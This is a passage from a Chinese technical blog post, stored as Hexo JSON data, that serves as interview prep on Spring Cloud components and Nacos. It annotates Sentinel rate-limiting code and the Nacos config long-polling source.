Otherwise,the costTime will be max of long and waitTime will overflow in some cases.\n        if (count <= 0) {\n            return false;\n        }\n \n        long currentTime = TimeUtil.currentTimeMillis();\n        // Calculate the interval between every two requests.\n        long costTime = Math.round(1.0 * (acquireCount) / count * 1000);\n \n        // Expected pass time of this request.\n        long expectedTime = costTime + latestPassedTime.get();\n \n        if (expectedTime <= currentTime) {\n            // Contention may exist here, but it's okay.\n            latestPassedTime.set(currentTime);\n            return true;\n        } else {\n            // Calculate the time to wait.\n            long waitTime = costTime + latestPassedTime.get() - TimeUtil.currentTimeMillis();\n            if (waitTime > maxQueueingTimeMs) {\n                return false;\n            } else {\n                long oldTime = latestPassedTime.addAndGet(costTime);\n                try {\n                    waitTime = oldTime - TimeUtil.currentTimeMillis();\n                    if (waitTime > maxQueueingTimeMs) {\n                        latestPassedTime.addAndGet(-costTime);\n                        return false;\n                    }\n                    // in race condition waitTime may <= 0\n                    if (waitTime > 0) {\n                        Thread.sleep(waitTime);\n                    }\n                    return true;\n                } catch (InterruptedException e) {\n                }\n            }\n        }\n        return false;\n    }\n```\n- Warm Up（WarmUpController 和 WarmUpRateLimiterController）：预热启动\n```java\n    @Override\n    public boolean canPass(Node node, int acquireCount, boolean prioritized) {\n        long passQps = (long) node.passQps();\n \n        long previousQps = (long) node.previousPassQps();\n        syncToken(previousQps);\n \n        // 开始计算它的斜率\n        // 如果进入了警戒线，开始调整他的qps\n        long restToken = storedTokens.get();\n        if (restToken >= warningToken) {\n            long aboveToken = restToken - warningToken;\n            // 消耗的速度要比warning快，但是要比慢\n            // current interval = restToken*slope+1/count\n            double warningQps = Math.nextUp(1.0 / (aboveToken * slope + 1.0 / count));\n            if (passQps + acquireCount <= warningQps) {\n                return true;\n            }\n        } else {\n            if (passQps + acquireCount <= count) {\n                return true;\n            }\n        }\n \n        return false;\n    }\n```\n\n","slug":"Springcloud最热点面试题","published":1,"updated":"2024-05-26T15:05:33.395Z","comments":1,"layout":"post","photos":[],"_id":"clylh1rya0011bsuh4pni9r1m","content":"<p>Spring Cloud是一系列框架的有序集合。它利用Spring Boot的开发便利性巧妙地简化了分布式系统基础设施的开发，如服务发现注册、配置中心、智能路由、消息总线、负载均衡、断路器、数据监控等，都可以用Spring Boot的开发风格做到一键启动和部署。</p>\n<p>Spring Cloud并没有重复制造轮子，它只是将各家公司开发的比较成熟、经得起实际考验的服务框架组合起来，通过Spring Boot风格进行再封装屏蔽掉了复杂的配置和实现原理，最终给开发者留出了一套简单易懂、易部署和易维护的分布式系统开发工具包。</p>\n<h2 id=\"服务注册与发现\"><a href=\"#服务注册与发现\" class=\"headerlink\" title=\"服务注册与发现\"></a>服务注册与发现</h2><h3 id=\"eureka\"><a href=\"#eureka\" class=\"headerlink\" title=\"eureka\"></a>eureka</h3><p>服务治理组件，包括服务端的注册中心和客户端的服务发现机制；</p>\n<h3 id=\"consul\"><a href=\"#consul\" class=\"headerlink\" title=\"consul\"></a>consul</h3><p>基于Hashicorp Consul的服务治理组件。</p>\n<h2 id=\"服务负载与均衡\"><a href=\"#服务负载与均衡\" class=\"headerlink\" title=\"服务负载与均衡\"></a>服务负载与均衡</h2><h3 id=\"ribbon\"><a href=\"#ribbon\" class=\"headerlink\" title=\"ribbon\"></a>ribbon</h3><p>负载均衡的服务调用组件，具有多种负载均衡调用策略；</p>\n<h3 id=\"loadbalancer\"><a href=\"#loadbalancer\" class=\"headerlink\" title=\"loadbalancer\"></a>loadbalancer</h3><h2 id=\"服务负载与调用\"><a href=\"#服务负载与调用\" class=\"headerlink\" title=\"服务负载与调用\"></a>服务负载与调用</h2><h3 id=\"feign\"><a href=\"#feign\" class=\"headerlink\" title=\"feign\"></a>feign</h3><p>基于Ribbon和Hystrix的声明式服务调用组件；</p>\n<h3 id=\"openFeign\"><a href=\"#openFeign\" class=\"headerlink\" title=\"openFeign\"></a>openFeign</h3><p>基于Ribbon和Hystrix的声明式服务调用组件，可以动态创建基于Spring MVC注解的接口实现用于服务调用，在Spring Cloud 2.0中已经取代Feign成为了一等公民。</p>\n<h2 id=\"服务熔断与降级\"><a href=\"#服务熔断与降级\" class=\"headerlink\" title=\"服务熔断与降级\"></a>服务熔断与降级</h2><h3 id=\"hystrix\"><a href=\"#hystrix\" class=\"headerlink\" title=\"hystrix\"></a>hystrix</h3><p>服务容错组件，实现了断路器模式，为依赖服务的出错和延迟提供了容错能力；</p>\n<h3 id=\"resilience4j\"><a href=\"#resilience4j\" class=\"headerlink\" title=\"resilience4j\"></a>resilience4j</h3><h2 id=\"服务网关\"><a href=\"#服务网关\" class=\"headerlink\" title=\"服务网关\"></a>服务网关</h2><h3 id=\"zuul\"><a href=\"#zuul\" class=\"headerlink\" title=\"zuul\"></a>zuul</h3><p>API网关组件，对请求提供路由及过滤功能。</p>\n<h3 id=\"zuul2\"><a href=\"#zuul2\" class=\"headerlink\" title=\"zuul2\"></a>zuul2</h3><h3 id=\"getway\"><a href=\"#getway\" class=\"headerlink\" title=\"getway\"></a>getway</h3><p>API网关组件，对请求提供路由及过滤功能。</p>\n<h2 id=\"服务分布式配置\"><a href=\"#服务分布式配置\" class=\"headerlink\" title=\"服务分布式配置\"></a>服务分布式配置</h2><h3 id=\"springcloud-config\"><a href=\"#springcloud-config\" class=\"headerlink\" title=\"springcloud config\"></a>springcloud config</h3><p>集中配置管理工具，分布式系统中统一的外部配置管理，默认使用Git来存储配置，可以支持客户端配置的刷新及加密、解密操作。</p>\n<h3 id=\"Nacos\"><a href=\"#Nacos\" class=\"headerlink\" title=\"Nacos\"></a>Nacos</h3><h2 id=\"总线\"><a href=\"#总线\" class=\"headerlink\" title=\"总线\"></a>总线</h2><h3 id=\"Spring-Cloud-Bus\"><a href=\"#Spring-Cloud-Bus\" class=\"headerlink\" title=\"Spring Cloud Bus\"></a>Spring Cloud Bus</h3><p>用于传播集群状态变化的消息总线，使用轻量级消息代理链接分布式系统中的节点，可以用来动态刷新集群中的服务配置。</p>\n<h1 id=\"springcloudAlibaba\"><a href=\"#springcloudAlibaba\" class=\"headerlink\" title=\"springcloudAlibaba\"></a>springcloudAlibaba</h1><h2 id=\"Nacos-1\"><a href=\"#Nacos-1\" class=\"headerlink\" title=\"Nacos\"></a>Nacos</h2><p>Nacos 是一个开源的分布式系统服务发现、配置管理和服务管理平台。它主要包含以下功能：</p>\n<p>服务发现与注册：Nacos 可以管理服务的注册和发现，支持 DNS 和 HTTP&#x2F;RESTful 方式。<br>配置管理：Nacos 可以动态管理配置，支持多种数据类型和版本控制。<br>服务管理：Nacos 可以对服务进行健康检查、流量管理、负载均衡等。</p>\n<h3 id=\"服务发现与注册\"><a href=\"#服务发现与注册\" class=\"headerlink\" title=\"服务发现与注册\"></a>服务发现与注册</h3><p>Nacos 实现服务发现和注册的核心代码位于 nacos&#x2F;naming 目录下，包括以下文件：</p>\n<ul>\n<li>naming-common&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;alibaba&#x2F;nacos&#x2F;api&#x2F;naming: 定义了服务发现和注册的 API 接口和数据模型。</li>\n<li>naming-core&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;alibaba&#x2F;nacos&#x2F;naming: 实现了服务发现和注册的核心逻辑。</li>\n<li>naming-impl&#x2F;src&#x2F;main&#x2F;java&#x2F;com&#x2F;alibaba&#x2F;nacos&#x2F;naming: 实现了服务发现和注册的具体实现。</li>\n</ul>\n<p>下面简单介绍一下 Nacos 的服务发现和注册的实现流程。</p>\n<h4 id=\"服务注册流程\"><a href=\"#服务注册流程\" class=\"headerlink\" title=\"服务注册流程\"></a>服务注册流程</h4><p>服务提供者向 Nacos 注册服务时，会调用 NamingService.registerInstance() 方法，该方法会做以下几件事情：</p>\n<ol>\n<li>将服务实例的元数据封装为 Instance 对象，包括服务名、IP、端口号、健康状态、元数据等。</li>\n<li>将 Instance 对象转换为 InstanceEntity 对象，包含了实例 ID 和实例元数据的 JSON 字符串。</li>\n<li>将 InstanceEntity 对象存储到 Nacos 中，可以存储到内存中或者持久化到磁盘中。</li>\n</ol>\n<h4 id=\"服务发现流程\"><a href=\"#服务发现流程\" class=\"headerlink\" title=\"服务发现流程\"></a>服务发现流程</h4><p>服务消费者向 Nacos 发现服务时，会调用 NamingService.getAllInstances() 或 NamingService.selectInstances() 方法，该方法会做以下几件事情：</p>\n<ol>\n<li>从 Nacos 中获取服务实例的元数据，包括服务名、IP、端口号、健康状态、元数据等。</li>\n<li>将元数据封装为 Instance 对象，存储到本地缓存中。</li>\n<li>根据负载均衡算法选择一个服务实例处理请求，可以选择轮询、随机、权重等算法。</li>\n</ol>\n<p>服务发现和注册的核心逻辑在 naming-core 目录下的 com.alibaba.nacos.naming 包中实现，主要包括以下类：</p>\n<ul>\n<li>com.alibaba.nacos.naming.core.InstancesManager: 维护服务实例的元数据和状态信息。</li>\n<li>com.alibaba.nacos.naming.core.Cluster: 维护一个服务的所有实例信息和负载均衡策略。</li>\n<li>com.alibaba.nacos.naming.core.InstanceOperator: 实现了服务实例的注册、注销和更新操作。</li>\n<li>com.alibaba.nacos.naming.core.DomainsManager: 维护多个服务的信息，包括服务名、集群名、命名空间等。</li>\n</ul>\n<p>服务发现和注册的具体实现在 naming-impl 目录下的 com.alibaba.nacos.naming 包中，主要包括以下类：</p>\n<ul>\n<li>com.alibaba.nacos.naming.push.PushService: 实现了服务实例的推送功能。</li>\n<li>com.alibaba.nacos.naming.healthcheck.HealthCheckProcessor: 实现了服务实例的健康检查功能。</li>\n<li>com.alibaba.nacos.naming.misc.GlobalConfig: 存储了一些全局配置，例如默认权重值、心跳间隔</li>\n</ul>\n<h3 id=\"配置动态刷新\"><a href=\"#配置动态刷新\" class=\"headerlink\" title=\"配置动态刷新\"></a>配置动态刷新</h3><p>从远端服务器获取变更数据的主要模式有两种：推（push）和拉（pull）。Push 模式简单来说就是服务端主动将数据变更信息推送给客户端，这种模式优点是时效性好，服务端数据发生变更可以立马通知到客户端，但这种模式需要服务端维持与客户端的心跳连接，会增加服务端实现的复杂度，服务端也需要占用更多的资源来维持与客户端的连接。</p>\n<p>而 Pull 模式则是客户端主动去服务器请求数据，例如，每间隔10ms就向服务端发起请求获取数据。显而易见pull模式存在时效性问题。请求的间隔也不太好设置，间隔太短，对服务器请求压力过大。间隔时间过长，那么必然会造成时效性很差。而且如果配置长时间不更新，并且存在大量的客户端就会产生大量无效的pull请求。</p>\n<p>Nacos 没有采用上述的两种模式，而是采用了长轮询方式结合了推和拉的优点：</p>\n<p><img src=\"/./2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/1.png\" alt=\"动态刷新图\"></p>\n<p>长轮询也是轮询，因此 Nacos 客户端会默认每10ms向服务端发起请求，当客户端请求服务端时会在请求头上携带长轮询的超时时间，默认是30s。而服务端接收到该请求时会hang住请求，为了防止客户端超时会在请求头携带的超时时间上减去500ms，因此默认会hang住请求29.5s。在这期间如果服务端发生了配置变更会产生相应的事件，监听到该事件后，会响应对应的客户端。这样一来客户端不会频繁发起轮询请求，而服务端也不需要维持与客户端的心跳，兼备了时效性和复杂度。</p>\n<p><img src=\"/./2024/05/26/Springcloud%E6%9C%80%E7%83%AD%E7%82%B9%E9%9D%A2%E8%AF%95%E9%A2%98/2.png\" alt=\"长轮询图\"></p>\n<blockquote>\n<p>1.4版本nacos使用Http短连接+长轮询的方式，客户端发起http请求，服务端hold住请求，当配置变更时响应客户端，超时时间30s。<br>2.0版本nacos用gRPC长连接代替了http短连接长轮询。配置同步采用推拉结合的方式。</p>\n</blockquote>\n<h4 id=\"Nacos-Config-长轮询源码剖析\"><a href=\"#Nacos-Config-长轮询源码剖析\" class=\"headerlink\" title=\"Nacos Config 长轮询源码剖析\"></a>Nacos Config 长轮询源码剖析</h4><p>首先，打开 com.alibaba.cloud.nacos.NacosConfigBootstrapConfiguration 这个类，从类名也可以看出该类是Nacos Config的启动配置类，是Nacos Config自动装配的入口。在该类中的 nacosConfigManager 方法实例化了一个 NacosConfigManager 对象，并注册到容器中：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">@Bean</span></span><br><span class=\"line\"><span class=\"meta\">@ConditionalOnMissingBean</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> NacosConfigManager <span class=\"title function_\">nacosConfigManager</span><span class=\"params\">(</span></span><br><span class=\"line\"><span class=\"params\">\t\tNacosConfigProperties nacosConfigProperties)</span> &#123;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"keyword\">new</span> <span class=\"title class_\">NacosConfigManager</span>(nacosConfigProperties);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>在 NacosConfigManager 的构造器中调用了 createConfigService 方法，这是一个静态方法用来创建 ConfigService 对象的单例。</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Compatible with old design,It will be perfected in the future.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">static</span> ConfigService <span class=\"title function_\">createConfigService</span><span class=\"params\">(</span></span><br><span class=\"line\"><span class=\"params\">\t\tNacosConfigProperties nacosConfigProperties)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 双重检查锁模式的单例</span></span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (Objects.isNull(service)) &#123;</span><br><span class=\"line\">\t\t<span class=\"keyword\">synchronized</span> (NacosConfigManager.class) &#123;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">if</span> (Objects.isNull(service)) &#123;</span><br><span class=\"line\">\t\t\t\t\tservice = NacosFactory.createConfigService(</span><br><span class=\"line\">\t\t\t\t\t\t\tnacosConfigProperties.assembleConfigServiceProperties());</span><br><span class=\"line\">\t\t\t\t&#125;</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t\t<span class=\"keyword\">catch</span> (NacosException e) &#123;</span><br><span class=\"line\">\t\t\t\tlog.error(e.getMessage());</span><br><span class=\"line\">\t\t\t\t<span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">NacosConnectionFailureException</span>(</span><br><span class=\"line\">\t\t\t\t\t\tnacosConfigProperties.getServerAddr(), e.getMessage(), e);</span><br><span class=\"line\">\t\t\t&#125;</span><br><span class=\"line\">\t\t&#125;</span><br><span class=\"line\">\t&#125;</span><br><span class=\"line\">\t<span class=\"keyword\">return</span> service;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>ConfigService 的具体实现是 NacosConfigService，在该类的构造器中主要初始化了 HttpAgent 和 ClientWorker 对象。ClientWorker 的构造器中则初始化了几个线程池：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"title function_\">ClientWorker</span><span class=\"params\">(<span class=\"keyword\">final</span> HttpAgent agent, <span class=\"keyword\">final</span> ConfigFilterChainManager configFilterChainManager,</span></span><br><span class=\"line\"><span class=\"params\">        <span class=\"keyword\">final</span> Properties properties)</span> &#123;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.agent = agent;</span><br><span class=\"line\">    <span class=\"built_in\">this</span>.configFilterChainManager = configFilterChainManager;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// Initialize the timeout parameter</span></span><br><span class=\"line\">    init(properties);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// 创建具有定时执行功能的单线程池，用于定时执行 checkConfigInfo 方法</span></span><br><span class=\"line\">    <span class=\"built_in\">this</span>.executor = Executors.newScheduledThreadPool(<span class=\"number\">1</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">ThreadFactory</span>() &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> Thread <span class=\"title function_\">newThread</span><span class=\"params\">(Runnable r)</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">Thread</span> <span class=\"variable\">t</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(r);</span><br><span class=\"line\">            t.setName(<span class=\"string\">&quot;com.alibaba.nacos.client.Worker.&quot;</span> + agent.getName());</span><br><span class=\"line\">            t.setDaemon(<span class=\"literal\">true</span>);</span><br><span class=\"line\">            <span class=\"keyword\">return</span> t;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"comment\">// 创建具有定时执行功能的且线程数与cpu核数相对应的线程池，用于根据需要动态刷新的配置文件执行 LongPollingRunnable，因此长轮询任务是可以有多个并行的</span></span><br><span class=\"line\">    <span class=\"built_in\">this</span>.executorService = Executors</span><br><span class=\"line\">            .newScheduledThreadPool(Runtime.getRuntime().availableProcessors(), <span class=\"keyword\">new</span> <span class=\"title class_\">ThreadFactory</span>() &#123;</span><br><span class=\"line\">                <span class=\"meta\">@Override</span></span><br><span class=\"line\">                <span class=\"keyword\">public</span> Thread <span class=\"title function_\">newThread</span><span class=\"params\">(Runnable r)</span> &#123;</span><br><span class=\"line\">                    <span class=\"type\">Thread</span> <span class=\"variable\">t</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">Thread</span>(r);</span><br><span class=\"line\">                    t.setName(<span class=\"string\">&quot;com.alibaba.nacos.client.Worker.longPolling.&quot;</span> + agent.getName());</span><br><span class=\"line\">                    t.setDaemon(<span class=\"literal\">true</span>);</span><br><span class=\"line\">                    <span class=\"keyword\">return</span> t;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;);</span><br><span class=\"line\">            </span><br><span class=\"line\">    <span class=\"comment\">// 每10ms执行一次 checkConfigInfo 方法</span></span><br><span class=\"line\">    <span class=\"built_in\">this</span>.executor.scheduleWithFixedDelay(<span class=\"keyword\">new</span> <span class=\"title class_\">Runnable</span>() &#123;</span><br><span class=\"line\">        <span class=\"meta\">@Override</span></span><br><span class=\"line\">        <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                checkConfigInfo();</span><br><span class=\"line\">            &#125; <span class=\"keyword\">catch</span> (Throwable e) &#123;</span><br><span class=\"line\">                LOGGER.error(<span class=\"string\">&quot;[&quot;</span> + agent.getName() + <span class=\"string\">&quot;] [sub-check] rotate check error&quot;</span>, e);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;, <span class=\"number\">1L</span>, <span class=\"number\">10L</span>, TimeUnit.MILLISECONDS);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">private</span> <span class=\"keyword\">void</span> <span class=\"title function_\">init</span><span class=\"params\">(Properties properties)</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// 长轮询的超时时间，默认为30秒，此参数会被放到请求头中带到服务端，服务端会根据该参数去做长轮询的hold</span></span><br><span class=\"line\">    timeout = Math.max(ConvertUtils.toInt(properties.getProperty(PropertyKeyConst.CONFIG_LONG_POLL_TIMEOUT),</span><br><span class=\"line\">            Constants.CONFIG_LONG_POLL_TIMEOUT), Constants.MIN_CONFIG_LONG_POLL_TIMEOUT);</span><br><span class=\"line\">    </span><br><span class=\"line\">    taskPenaltyTime = ConvertUtils</span><br><span class=\"line\">            .toInt(properties.getProperty(PropertyKeyConst.CONFIG_RETRY_TIME), Constants.CONFIG_RETRY_TIME);</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"built_in\">this</span>.enableRemoteSyncConfig = Boolean</span><br><span class=\"line\">            .parseBoolean(properties.getProperty(PropertyKeyConst.ENABLE_REMOTE_SYNC_CONFIG));</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Check config info.</span></span><br><span class=\"line\"><span class=\"comment\"> */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">checkConfigInfo</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">    <span class=\"comment\">// Dispatch taskes.</span></span><br><span class=\"line\">    <span class=\"comment\">// 获取需要监听的文件数量</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">listenerSize</span> <span class=\"operator\">=</span> cacheMap.size();</span><br><span class=\"line\">    <span class=\"comment\">// Round up the longingTaskCount.</span></span><br><span class=\"line\">    <span class=\"comment\">// 默认一个 LongPollingRunnable 可以处理监听3k个配置文件的变化，超过3k个才会创建新的 LongPollingRunnable</span></span><br><span class=\"line\">    <span class=\"type\">int</span> <span class=\"variable\">longingTaskCount</span> <span class=\"operator\">=</span> (<span class=\"type\">int</span>) Math.ceil(listenerSize / ParamUtil.getPerTaskConfigSize());</span><br><span class=\"line\">    <span class=\"keyword\">if</span> (longingTaskCount &gt; currentLongingTaskCount) &#123;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (<span class=\"type\">int</span> <span class=\"variable\">i</span> <span class=\"operator\">=</span> (<span class=\"type\">int</span>) currentLongingTaskCount; i &lt; longingTaskCount; i++) &#123;</span><br><span class=\"line\">            <span class=\"comment\">// The task list is no order.So it maybe has issues when changing.</span></span><br><span class=\"line\">            executorService.execute(<span class=\"keyword\">new</span> <span class=\"title class_\">LongPollingRunnable</span>(i));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        currentLongingTaskCount = longingTaskCount;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>LongPollingRunnable 类主要用于检查本地配置，以及长轮询地去服务端获取变更配置的 dataid 和 group，其代码位于 com.alibaba.nacos.client.config.impl.ClientWorker 类，代码如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">class</span> <span class=\"title class_\">LongPollingRunnable</span> <span class=\"keyword\">implements</span> <span class=\"title class_\">Runnable</span> &#123;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">private</span> <span class=\"keyword\">final</span> <span class=\"type\">int</span> taskId;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">LongPollingRunnable</span><span class=\"params\">(<span class=\"type\">int</span> taskId)</span> &#123;</span><br><span class=\"line\">        <span class=\"built_in\">this</span>.taskId = taskId;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    </span><br><span class=\"line\">    <span class=\"meta\">@Override</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">void</span> <span class=\"title function_\">run</span><span class=\"params\">()</span> &#123;</span><br><span class=\"line\">        </span><br><span class=\"line\">        List&lt;CacheData&gt; cacheDatas = <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;CacheData&gt;();</span><br><span class=\"line\">        List&lt;String&gt; inInitializingCacheList = <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;String&gt;();</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"comment\">// check failover config</span></span><br><span class=\"line\">            <span class=\"comment\">// 遍历本地缓存的配置</span></span><br><span class=\"line\">            <span class=\"keyword\">for</span> (CacheData cacheData : cacheMap.values()) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (cacheData.getTaskId() == taskId) &#123;</span><br><span class=\"line\">                    cacheDatas.add(cacheData);</span><br><span class=\"line\">                    <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                        <span class=\"comment\">// 检查本地配置</span></span><br><span class=\"line\">                        checkLocalConfig(cacheData);</span><br><span class=\"line\">                        <span class=\"keyword\">if</span> (cacheData.isUseLocalConfigInfo()) &#123;</span><br><span class=\"line\">                            cacheData.checkListenerMd5();</span><br><span class=\"line\">                        &#125;</span><br><span class=\"line\">                    &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">                        LOGGER.error(<span class=\"string\">&quot;get local config info error&quot;</span>, e);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\">// check server config</span></span><br><span class=\"line\">            <span class=\"comment\">// 通过长轮询检查服务端配置</span></span><br><span class=\"line\">            List&lt;String&gt; changedGroupKeys = checkUpdateDataIds(cacheDatas, inInitializingCacheList);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (!CollectionUtils.isEmpty(changedGroupKeys)) &#123;</span><br><span class=\"line\">                LOGGER.info(<span class=\"string\">&quot;get changedGroupKeys:&quot;</span> + changedGroupKeys);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"keyword\">for</span> (String groupKey : changedGroupKeys) &#123;</span><br><span class=\"line\">                String[] key = GroupKey.parseKey(groupKey);</span><br><span class=\"line\">                <span class=\"type\">String</span> <span class=\"variable\">dataId</span> <span class=\"operator\">=</span> key[<span class=\"number\">0</span>];</span><br><span class=\"line\">                <span class=\"type\">String</span> <span class=\"variable\">group</span> <span class=\"operator\">=</span> key[<span class=\"number\">1</span>];</span><br><span class=\"line\">                <span class=\"type\">String</span> <span class=\"variable\">tenant</span> <span class=\"operator\">=</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (key.length == <span class=\"number\">3</span>) &#123;</span><br><span class=\"line\">                    tenant = key[<span class=\"number\">2</span>];</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">                <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">                    String[] ct = getServerConfig(dataId, group, tenant, <span class=\"number\">3000L</span>);</span><br><span class=\"line\">                    <span class=\"type\">CacheData</span> <span class=\"variable\">cache</span> <span class=\"operator\">=</span> cacheMap.get(GroupKey.getKeyTenant(dataId, group, tenant));</span><br><span class=\"line\">                    cache.setContent(ct[<span class=\"number\">0</span>]);</span><br><span class=\"line\">                    <span class=\"keyword\">if</span> (<span class=\"literal\">null</span> != ct[<span class=\"number\">1</span>]) &#123;</span><br><span class=\"line\">                        cache.setType(ct[<span class=\"number\">1</span>]);</span><br><span class=\"line\">                    &#125;</span><br><span class=\"line\">                    LOGGER.info(<span class=\"string\">&quot;[&#123;&#125;] [data-received] dataId=&#123;&#125;, group=&#123;&#125;, tenant=&#123;&#125;, md5=&#123;&#125;, content=&#123;&#125;, type=&#123;&#125;&quot;</span>,</span><br><span class=\"line\">                            agent.getName(), dataId, group, tenant, cache.getMd5(),</span><br><span class=\"line\">                            ContentUtils.truncateContent(ct[<span class=\"number\">0</span>]), ct[<span class=\"number\">1</span>]);</span><br><span class=\"line\">                &#125; <span class=\"keyword\">catch</span> (NacosException ioe) &#123;</span><br><span class=\"line\">                    <span class=\"type\">String</span> <span class=\"variable\">message</span> <span class=\"operator\">=</span> String</span><br><span class=\"line\">                            .format(<span class=\"string\">&quot;[%s] [get-update] get changed config exception. dataId=%s, group=%s, tenant=%s&quot;</span>,</span><br><span class=\"line\">                                    agent.getName(), dataId, group, tenant);</span><br><span class=\"line\">                    LOGGER.error(message, ioe);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">for</span> (CacheData cacheData : cacheDatas) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">if</span> (!cacheData.isInitializing() || inInitializingCacheList</span><br><span class=\"line\">                        .contains(GroupKey.getKeyTenant(cacheData.dataId, cacheData.group, cacheData.tenant))) &#123;</span><br><span class=\"line\">                    cacheData.checkListenerMd5();</span><br><span class=\"line\">                    cacheData.setInitializing(<span class=\"literal\">false</span>);</span><br><span class=\"line\">                &#125;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            inInitializingCacheList.clear();</span><br><span class=\"line\">            </span><br><span class=\"line\">            executorService.execute(<span class=\"built_in\">this</span>);</span><br><span class=\"line\">            </span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Throwable e) &#123;</span><br><span class=\"line\">            </span><br><span class=\"line\">            <span class=\"comment\">// If the rotation training task is abnormal, the next execution time of the task will be punished</span></span><br><span class=\"line\">            LOGGER.error(<span class=\"string\">&quot;longPolling error : &quot;</span>, e);</span><br><span class=\"line\">            executorService.schedule(<span class=\"built_in\">this</span>, taskPenaltyTime, TimeUnit.MILLISECONDS);</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>上面有个 checkUpdateDataIds 方法，用于获取发生变更了的配置文件的dataId列表，它同样位于 ClientWorker 内。如下：</p>\n<figure class=\"highlight java\"><table><tr><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">/**</span></span><br><span class=\"line\"><span class=\"comment\"> * Fetch the dataId list from server.</span></span><br><span class=\"line\"><span class=\"comment\"> *</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> cacheDatas              CacheDatas for config infomations.</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@param</span> inInitializingCacheList initial cache lists.</span></span><br><span class=\"line\"><span class=\"comment\"> * <span class=\"doctag\">@return</span> String include dataId and group (ps: it maybe null).</span></span><br><span class=\"line\"><span class=\"comment\"> 